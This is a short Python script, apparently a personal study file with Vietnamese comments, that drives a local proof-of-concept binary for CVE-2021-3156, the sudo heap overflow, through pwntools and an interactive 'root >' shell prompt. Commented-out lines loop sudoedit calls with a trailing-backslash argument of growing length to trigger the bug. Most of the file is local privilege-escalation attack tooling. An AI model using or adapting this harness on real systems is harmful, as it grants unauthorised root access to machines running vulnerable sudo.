
# tuan_name = str(input("hay nhap ten cua ban : "))
# print("ten cua tuan la "+ tuan_name)
# print(''.join(['\033[' + str(x) + 'mfoo' for x in range(0,150)]) +'\033[0m')
# thử brute force sudo
# import subprocess
# for i in range(0,1000):
#     print(subprocess.run(["/usr/bin/sudoedit",'-s','aaaaaaaaaaaaaaa\\','b'*i]))

from pwn import *

from cmd import Cmd


def exploit():
    s = process("/home/cheaterdxd/dttn/linux/cve_2021_3156/poc")
    while(1):
        command = input("root > ")
        
        try:
            s.sendline(command)
            while(True):
                out = s.recvline(timeout=0.3).strip(b'\n').decode()
                if(out==''):
                    break
                print(out)
        except:
            print("end of process")
            break


class MyPrompt(Cmd):
    def do_exit(self, inp):
        '''exit'''
        print("Bye")
        return True
    
    def do_exploit(self,inp):
        '''exploit cve'''
        exploit()

prompt = MyPrompt()
prompt.prompt = '# '
prompt.cmdloop()

